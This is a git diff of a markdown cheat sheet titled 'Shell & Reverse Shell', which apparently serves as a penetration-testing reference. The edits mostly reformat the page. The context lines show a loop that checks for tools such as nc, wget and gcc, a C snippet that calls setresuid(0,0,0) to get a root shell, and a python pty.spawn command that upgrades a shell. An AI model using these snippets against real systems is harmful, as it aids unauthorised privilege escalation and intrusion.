@@ -5,10 +5,8 @@ description: >
   There are list of Shell and Reverse Shell Collected from Internet.
 ---
 
-
 # Shell & Reverse Shell
 
-There are list of Shell and Reverse Shell Collected from Internet.
 
 
 ## Find Out What program are Install
@@ -24,7 +22,8 @@ $ for item in $(echo "nmap nc perl python ruby gcc wget sudo curl php"); do whic
 ## C Shell
 
 > #### vim cShell.c
-```c
+
+```bash
 
 int main(){
     setresuid(0,0,0);
@@ -34,9 +33,11 @@ int main(){
 ```
 > #### for compile `$ gcc cShell.c -o cShell`
 
+
 ## TTY Shell
 
 ```bash
+
 $ python -c 'import pty;pty.spawn("/bin/bash")'
 # Background shell with `Ctrl+z`
 
